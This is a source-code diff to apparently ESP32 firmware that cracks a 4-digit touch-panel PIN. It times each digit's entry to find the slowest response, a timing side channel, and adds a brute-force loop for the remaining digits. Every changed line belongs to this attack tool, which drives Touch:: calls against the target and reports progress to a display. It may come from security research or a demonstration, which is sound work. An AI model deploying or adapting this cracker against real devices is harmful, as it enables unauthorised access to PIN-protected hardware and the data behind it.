@@ -8,20 +8,22 @@
 #define FAIL_PIN GPIO_NUM_27
 #define FAIL_PIN2 12
 #define SUCCESS_PIN 14
-#define NUM_OF_ITERAIONS 20
+#define NUM_OF_ATTEMPTS_FOR_DIGIT 20
 #define PASS_SIZE 4 
 
 namespace TSCA {
-    const float PROGRESS_INTERVAL = 100.0 / (NUM_OF_ITERAIONS * (PASS_SIZE-1) * 10);
+    const uint8_t NUM_OF_BRUTEFORCE_DIGITS = round(log10((NUM_OF_ATTEMPTS_FOR_DIGIT*2)/log(10))+1);
+    const uint32_t NUM_OF_BRUTEFORCE_ITERAIONS = pow(10, NUM_OF_BRUTEFORCE_DIGITS);
+    const uint32_t NUM_OF_ITERATIONS = NUM_OF_BRUTEFORCE_ITERAIONS + (NUM_OF_ATTEMPTS_FOR_DIGIT * (PASS_SIZE-NUM_OF_BRUTEFORCE_DIGITS) * 10);
+    const float PROGRESS_INTERVAL = 100.0 / NUM_OF_ITERATIONS;
     
     typedef enum {NOTHING, FINISHED_BATCH, SUCCESS, FAIL, INC, FOUND_I2C} EventType_t;
     EventType_t eventState = NOTHING;
     float progress = 0;
 
-    bool finish = false;
     TaskHandle_t tftTaskHandle = NULL;
 
-    uint64_t sendPassword(uint8_t* password, SemaphoreHandle_t* lock);
+    uint64_t sendPassword(uint8_t* password);
 
     void theEnd();
 
@@ -42,13 +44,11 @@ namespace TSCA {
 
         ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
         eventState = NOTHING;
-        log_d("start");
         delay(3000);
         Touch::reset();
         Touch::relaese();
         delay(1500);
         if (tftTaskHandle != NULL) {
-            log_d("calling tft");
             eventState = FOUND_I2C;
             xTaskNotifyGive(tftTaskHandle);
         }
@@ -56,17 +56,17 @@ namespace TSCA {
         // generate the password each loop iteration
         for(;;){
             memcpy(pass, initPass, PASS_SIZE);
-
-            for (uint8_t index = 0; index < PASS_SIZE-1; index++)
+            uint8_t index = 0;
+            for (; index < PASS_SIZE-NUM_OF_BRUTEFORCE_DIGITS; index++)
             {
                 uint16_t maxes[10] = {0,0,0,0,0,0,0,0,0,0};
                 uint64_t results[10] = {0,0,0,0,0,0,0,0,0,0};
-                for (uint32_t i = 0; i < NUM_OF_ITERAIONS; i++){
+                for (uint32_t i = 0; i < NUM_OF_ATTEMPTS_FOR_DIGIT; i++){
                     uint64_t max_time = 0;
                     for (uint8_t j = 0; j < 10; j++)
                     {
                         pass[index] = j;
-                        results[j] = sendPassword(pass, (SemaphoreHandle_t*)arg);
+                        results[j] = sendPassword(pass);
                         if(results[j] > max_time)
                             max_time = results[j];
                         progress += PROGRESS_INTERVAL;
@@ -108,11 +108,15 @@ namespace TSCA {
                     xTaskNotifyGive(tftTaskHandle);
                 }
             }
-            for (uint8_t j = 0; j < 10; j++)
+            for (uint32_t j = 0; j < NUM_OF_BRUTEFORCE_ITERAIONS; j++)
             {
-                pass[PASS_SIZE-1] = j;
-                sendPassword(pass, (SemaphoreHandle_t*)arg);
-                progress += PROGRESS_INTERVAL*NUM_OF_ITERAIONS;
+                uint32_t divider = 1;
+                for (uint32_t i = 0; i < NUM_OF_BRUTEFORCE_DIGITS; i++){
+                    pass[index+i] = ((uint32_t)(j/divider)) % 10;
+                    divider *= 10;
+                }
+                sendPassword(pass);
+                progress += PROGRESS_INTERVAL;
                 if (tftTaskHandle != NULL) {
                     TSCA::eventState = INC;
                     xTaskNotifyGive(tftTaskHandle);
@@ -128,7 +132,7 @@ namespace TSCA {
 
     //================================================================================================
 
-    uint64_t sendPassword(uint8_t* password, SemaphoreHandle_t* lock)
+    uint64_t sendPassword(uint8_t* password)
     {
         for (uint8_t i = 0; i < PASS_SIZE; i++){
             Touch::touch(password[i]);
